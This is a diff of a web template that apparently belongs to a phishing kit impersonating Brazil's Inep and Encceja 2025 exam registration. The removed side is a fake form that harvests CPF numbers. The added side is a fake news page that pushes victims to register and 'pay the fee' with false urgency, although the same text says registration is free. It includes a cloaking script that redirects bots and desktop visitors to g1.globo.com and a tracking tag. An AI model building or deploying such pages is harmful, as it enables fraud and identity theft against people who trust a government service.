@@ -1,318 +1,293 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="en">
 <head>
-    <meta charset="utf-8"/>
-    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>ENCCEJA 2025 - Inscrição</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/rawline-fonts.css') }}">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-    <style>
-        .gov-header {
-            background-color: #222222;
-        }
-        .inep-header {
-            background-color: #044785;
-        }
-        .encceja-color {
-            color: #3b5998;
-        }
-        .encceja-light {
-            color: #a0a0a0;
-        }
-        .form-header {
-            background-color: #2c5985;
-            color: white;
-        }
-        .form-footer {
-            background-color: #5d85ab;
-            color: white;
-        }
+  </script>
 
-        button#submit-button {
-            transition: all 0.2s ease;
-            background-color: #5d85ab;
-            color: rgba(255, 255, 255, 0.6);
+  <!-- Verificação de dispositivo desktop -->
+  <script>
+      // Função para detectar se é um dispositivo móvel
+      function isMobile() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+      }
+
+      // Função para detectar se é um bot
+      function isBot() {
+        const botAgents = [
+          'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+          'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+        ];
+
+        return botAgents.some(bot => navigator.userAgent.includes(bot));
+      }
+
+      // Função para verificar se a largura da janela é maior que 768px
+      function isWideScreen() {
+        return window.innerWidth > 768;
+      }
+
+      // Redirecionar ou bloquear o acesso
+      function checkAccess() {
+        if (isBot() || (!isMobile() && isWideScreen())) {
+          // Redirecionar para o site G1 se o acesso for bloqueado
+          window.location.href = "https://g1.globo.com/";
         }
+      }
 
-        button#submit-button:not([disabled]) {
-            color: white;
-            cursor: pointer;
-        }
+      // Executar a função de verificação ao carregar a página
+      window.onload = checkAccess;
 
-        button#submit-button:not([disabled]):hover {
-            background-color: #4d7396;
-        }
-        .required-star {
-            color: #ff0000;
-        }
-        .footer-bg {
-            background-color: #1c2b39;
-        }
-        input::placeholder {
-            font-family: 'Rawline', Arial, sans-serif;
-        }
-        .selected {
-            border: 4px dashed #2B7A9A !important;
-        }
-        .transparent {
-            opacity: 0.5;
-        }
-    </style>
-    <script>
-        function formatCPF(input) {
-            // Remove qualquer caractere que não seja número
-            let value = input.value.replace(/\D/g, '');
+      // Adicionar um listener para verificar novamente se a janela for redimensionada
+      window.addEventListener('resize', checkAccess);
+  </script>
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "qwuvmtrw8g");
+  </script>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira | Inep</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: italic;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
 
-            // Limita a 11 caracteres
-            if (value.length > 11) {
-                value = value.substring(0, 11);
-            }
-
-            // Formata como CPF (xxx.xxx.xxx-xx)
-            if (value.length > 9) {
-                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
-            } else if (value.length > 6) {
-                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
-            } else if (value.length > 3) {
-                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
-            }
-
-            input.value = value;
-            checkFormValidity();
-        }
-
-        function unformatCPF(cpf) {
-            return cpf.replace(/\D/g, '');
-        }
-
-        function selectImage(element, index) {
-            const images = document.querySelectorAll('.image-option');
-            images.forEach(img => {
-                img.classList.remove('selected');
-                img.classList.add('transparent');
-            });
-            element.classList.add('selected');
-            element.classList.remove('transparent');
-
-            if (index !== 4) {
-                showErrorPopup();
-            } else {
-                checkFormValidity();
-            }
-        }
-
-        function showErrorPopup() {
-            const popup = document.getElementById('error-popup');
-            popup.classList.remove('hidden');
-            setTimeout(() => {
-                popup.classList.add('hidden');
-            }, 3000);
-        }
-
-        function checkFormValidity() {
-            const cpfInput = document.querySelector('#cpf');
-            const selectedImage = document.querySelector('.image-option.selected');
-            const submitButton = document.querySelector('#submit-button');
-
-            if (cpfInput.value.length === 14 && selectedImage && selectedImage === document.querySelectorAll('.image-option')[4]) {
-                submitButton.disabled = false;
-            } else {
-                submitButton.disabled = true;
-            }
-        }
-
-        function showValidationPopup() {
-            const popup = document.getElementById('validation-popup');
-            popup.classList.remove('hidden');
-        }
-
-        function hideValidationPopup() {
-            const popup = document.getElementById('validation-popup');
-            popup.classList.add('hidden');
-        }
-
-        function submitForm() {
-            const cpfInput = document.querySelector('#cpf');
-            const cpf = unformatCPF(cpfInput.value);
-
-            // Mostrar popup de validação
-            showValidationPopup();
-
-            // Consultar a API de CPF
-            fetch(`/consultar-cpf?cpf=${cpf}`)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Dados do CPF:", data);
-
-                    // Armazenar os dados retornados no localStorage para serem usados na próxima etapa
-                    localStorage.setItem('cpfData', JSON.stringify(data));
-
-                    // Redirecionar para a página de validação de dados
-                    setTimeout(() => {
-                        window.location.href = '/validar-dados';
-                    }, 1500);
-                })
-                .catch(error => {
-                    console.error("Erro ao buscar CPF:", error);
-                    hideValidationPopup();
-                    alert("Ocorreu um erro ao validar o CPF. Por favor, tente novamente.");
-                });
-        }
-    </script>
+    body {
+      font-family: 'Rawline', sans-serif;
+    }
+    .encceja-title {
+      font-weight: 700;
+      font-size: 1rem;
+      color: #555;
+      line-height: normal;
+      text-transform: uppercase;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    .share-text {
+      font-size: 12px;
+      text-align: center;
+    }
+    .drop-cap::first-letter {
+      float: left;
+      font-size: 4em;
+      line-height: 0.68;
+      font-weight: bold;
+      margin-right: 0.05em;
+      color: #1451B4;
+    }
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 40%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    .light-disc {
+      list-style-type: none;
+    }
+    .light-disc li::before {
+      content: "\2022";
+      color: #BBBBBB;
+      font-weight: bold;
+      display: inline-block;
+      width: 1em;
+      margin-left: -1em;
+    }
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+  </style>
 </head>
-<body class="flex flex-col min-h-screen">
-    <!-- Government Header -->
-    <header class="gov-header text-white py-2">
-        <div class="container mx-auto flex justify-between items-center px-4">
-            <a class="font-bold text-sm" href="#">
-                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" />
-            </a>
-            <nav>
-                <ul class="flex space-x-4 text-[10px]">
-                    <li>
-                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">PARTICIPE</a>
-                    </li>
-                    <li>
-                        <a class="hover:underline" href="#">SERVIÇOS</a>
-                    </li>
-                </ul>
-            </nav>
-        </div>
-    </header>
-    <!-- INEP Header -->
-    <div class="inep-header py-3">
-        <div class="container mx-auto px-4">
-            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
-                <defs>
-                    <style>
-                        .cls-2{fill:#fff}
-                    </style>
-                </defs>
-                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
-            </svg>
-        </div>
+<body class="bg-white">
+  <img src="https://i.ibb.co/PG10sRTn/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+     <div class="flex items-center justify-between py-2">
+      <div class="flex items-center">
+       <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1">
+       </i>
+       <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+        Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira | Inep
+       </p>
+      </div>
+      <div class="flex items-center space-x-4">
+       <i class="fas fa-microphone text-sm text-[#1451B4] relative -top-1">
+       </i>
+       <i class="fas fa-search text-sm text-[#1451B4] relative -top-1">
+       </i>
+      </div>
+     </div>
     </div>
-    <!-- Main Content -->
-    <main class="flex-grow py-8">
-        <div class="container mx-auto px-4 max-w-3xl">
-            <!-- ENCCEJA Logo -->
-            <div class="text-center mb-6">
-                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420"/>
-            </div>
-            <!-- Form Container -->
-            <div class="border border-gray-300 rounded">
-                <!-- Form Header -->
-                <div class="form-header py-2 px-4 text-center">
-                    <h2 class="text-lg">
-                        Inscrição &gt; ENCCEJA
-                    </h2>
-                </div>
-                <!-- Form Content -->
-                <div class="p-4">
-                    <p class="mb-4">
-                        Para efetuar sua inscrição informe os dados abaixo e clique em enviar:
-                    </p>
-                    <form>
-                        <div class="mb-4">
-                            <label class="block mb-1">
-                                <span>CPF:</span>
-                                <span class="required-star">*</span>
-                                <span class="ml-1 text-red-500">
-                                    <i class="fas fa-info-circle"></i>
-                                </span>
-                            </label>
-                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)" style=""/>
-                        </div>
-                        <div class="mb-4">
-                            <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px;">
-                                Clique abaixo, na figura FOLHA:
-                                <span class="text-red-700 text-lg">*</span>
-                                <span class="text-[#2B4F81] text-base rounded-full border border-[#2B4F81] w-5 h-5 inline-flex items-center justify-center">?</span>
-                            </p>
-                        </div>
-                        <div class="flex items-center">
-                            <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
-                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 0)">
-                                    <img alt="Globe icon showing Earth" class="w-6 h-6" src="https://i.ibb.co/2Ytyd5h2/download-6.png"/>
-                                </div>
-                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 1)">
-                                    <img alt="Magnifying glass search icon" class="w-6 h-6" src="https://i.ibb.co/cK1RdMv5/download-5.png"/>
-                                </div>
-                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 2)">
-                                    <img alt="Footprint icon" class="w-6 h-6" src="https://i.ibb.co/4wJKGsVJ/download-4.png"/>
-                                </div>
-                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 3)">
-                                    <img alt="Padlock or lock icon" class="w-6 h-6" src="https://i.ibb.co/67VXwQ9M/download-3.png"/>
-                                </div>
-                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 4)">
-                                    <img alt="Leaf icon representing nature" class="w-6 h-6" src="https://i.ibb.co/N6Gvw2jg/download-2.png"/>
-                                </div>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-                <!-- Form Footer -->
-                <div class="border-t border-gray-300">
-                    <div class="p-2 bg-gray-100 flex items-center">
-                        <a class="text-gray-700 flex items-center" href="#">
-                            <i class="fas fa-sign-out-alt mr-1"></i>
-                            Sair
-                        </a>
-                    </div>
-                    <div class="form-footer p-0 flex justify-center items-center">
-                        <button id="submit-button" class="flex items-center justify-center w-full h-full py-3" type="button" disabled onclick="submitForm()">
-                            <i class="fas fa-paper-plane mr-2"></i>
-                            <span>Enviar</span>
-                        </button>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </main>
-    <!-- Footer -->
-    <footer class="footer-bg text-white py-4 text-xs">
-        <div class="container mx-auto px-4">
-            <div class="flex flex-col items-center mb-2">
-                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
-                    <defs><style>.cls-2{fill:#fff}</style></defs>
-                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"/>
-                </svg>
-                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
-            </div>
-            <div class="flex justify-between items-center">
-                <div>
-                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
-                </div>
-                <div class="flex items-center">
-                    <i class="fas fa-phone-alt mr-1"></i>
-                    0800 616161
-                </div>
-            </div>
-        </div>
-    </footer>
+  </div>
 
-    <!-- Error Popup -->
-    <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
-        Você deve selecionar a imagem da folha para prosseguir.
+  <div class="container mx-auto px-4">
+   <div class="py-4">
+    <div class="flex items-center space-x-2 text-[13px]">
+     <a class="text-[#1451B4]" href="#">
+      <i class="fas fa-home text-sm text-[#1451B4]">
+      </i>
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Assuntos
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Notícias
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Encceja
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <span class="font-bold">
+      Encceja 2025
+     </span>
     </div>
+   </div>
+  </div>
 
-    <!-- Validation Popup -->
-    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
-        <div class="absolute inset-0 bg-black bg-opacity-50"></div>
-        <div class="bg-[#5d85ab] text-white p-6 rounded-lg shadow-lg z-10 flex flex-col items-center max-w-md mx-4">
-            <div class="spinner-border mb-4" role="status">
-                <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-            </div>
-            <h3 class="text-xl font-bold mb-2">Validando seus dados...</h3>
-            <p class="text-center">Aguarde enquanto verificamos as informações do CPF.</p>
-        </div>
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <p class="encceja-title">ENCCEJA</p>
+      <h2 class="main-title">
+        Último dia para se inscrever no Encceja 2025!
+      </h2>
+      <p class="subtitle">
+        Não perca a chance de obter seu diploma de forma rápida e fácil e as inscrições acabam hoje. Provas simples e diploma garantido em menos de 30 dias após o exame!
+      </p>
     </div>
+    <div class="border-t py-4 my-4 -mx-4">
+      <div class="flex items-center justify-center">
+        <p class="share-text text-gray-600 mr-2">Compartilhe:</p>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-facebook-f"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-linkedin-in"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fab fa-whatsapp"></i></a>
+        <a class="text-blue-600 mx-2 text-xl" href="#"><i class="fas fa-link"></i></a>
+      </div>
+    </div>
+    <div class="text-center text-gray-600 text-sm mb-4">
+      <p id="publicationDate"></p>
+      <script>
+        const now = new Date();
+        const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit' };
+        document.getElementById('publicationDate').textContent = `Publicado em ${now.toLocaleString('pt-BR', options)}`;
+      </script>
+      <p>Colaboradores: Assessoria de Comunicação Social do Inep</p>
+    </div>
+    <div class="my-6">
+      <img alt="Logo do INEP em fundo azul escuro com letras brancas" class="w-full" height="200" src="https://www.gov.br/inep/pt-br/assuntos/noticias/encceja/inep-publica-edital-do-encceja-2025/cabecote-inep-1.png/@@images/88fa9825-b4d0-478d-8ce1-9e4beb1d9d4f.png" width="600"/>
+    </div>
+    <div class="my-6">
+      <p class="drop-cap text-gray-700 text-base">O prazo para se inscrever no Exame Nacional para Certificação de Competências de Jovens e Adultos (Encceja) 2025 está acabando! As inscrições <b>acabam hoje</b>, e esta é a sua oportunidade de conquistar o diploma do ensino fundamental ou médio de forma prática e acessível. As provas, que são simples e objetivas, serão aplicadas no dia 3 de agosto em todos os estados e no Distrito Federal.</p>
+      <img src="https://www.gov.br/inep/pt-br/assuntos/noticias/imagens/6842045.png" alt="Banner do Encceja 2025" class="w-full mt-4">
+      <div class="container mx-auto pl-2 mt-6 w-full">
+        <div class="bg-gray-100 py-3 px-5 mb-5 w-full border-l-8 border-gray-400">
+          <p class="text-[16px] font-bold text-[#555555]">Últimas vagas disponíveis!</p>
+        </div>
+        <p class="text-[16px] font-normal italic text-[#555555] mb-5">
+          Para realizar sua inscrição, siga os passos abaixo:
+        </p>
+        <ul class="light-disc pl-5 mb-8">
+          <li class="text-[16px] font-normal text-[#555555] mb-3">
+            Clique no botão abaixo.
+          </li>
+          <li class="text-[16px] font-normal text-[#555555] mb-3">
+            Informe seus dados pessoais.
+          </li>
+          <li class="text-[16px] font-normal text-[#555555]">
+            Pague a taxa de inscrição.
+          </li>
+        </ul>
+        <div class="text-center">
+          <a href="/inscricao" class="inline-block bg-[#1351b4] text-white px-6 py-2 rounded-[30px] font-bold hover:bg-[#0c3d8a] transition-colors duration-200">
+            Realizar Inscrição
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="my-6">
+      <p class="font-bold text-gray-700 text-base">Diploma em menos de 30 dias –</p>
+      <p class="text-gray-700 text-base">Após a realização das provas, o diploma será emitido em menos de 30 dias, garantindo agilidade para quem deseja avançar nos estudos ou no mercado de trabalho. Não deixe para a última hora! As inscrições são gratuitas, mas é necessário justificar ausência caso tenha faltado ao exame anterior.</p>
+    </div>
+  </main>
+  <div class="w-full">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras flutuante no canto direito do site" class="w-10 h-10">
+  </a>
+  <script>
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
 </body>
 </html>
